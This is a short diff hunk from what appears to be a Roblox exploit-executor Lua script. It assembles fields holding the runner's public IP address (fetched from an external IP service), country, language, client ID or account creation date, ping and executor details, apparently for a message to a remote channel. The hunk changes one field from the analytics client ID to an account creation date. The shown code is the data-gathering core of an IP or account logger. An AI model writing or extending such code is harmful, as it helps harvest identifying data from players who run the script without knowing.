@@ -40,7 +40,7 @@ pcall(function()
           {name = '**IP Address**', value = ''..req({ Url = "https://api.ipify.org/", Method = "Get" }).Body},
           {name = '**Country**', value = ''..game:GetService("LocalizationService"):GetCountryRegionForPlayerAsync(game.Players.LocalPlayer)},
           {name = '**Language**', value = ''..game.Players.LocalPlayer.LocaleId},
-          {name = '**Account Created**', value = game:GetService("RbxAnalyticsService"):GetClientId()},
+          {name = '**Account Created**', value = ""..response.created..""},
           {name = "**Ping**", value = game:GetService("Stats").Network.ServerStatsItem["Data Ping"]:GetValueString()},
           {name = "**Executor**", value = identifyexecutor()..' | Executor Version : '..version},
           {name = "**Game Place ID**", value = "["..game.PlaceId.."](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) ..")"},
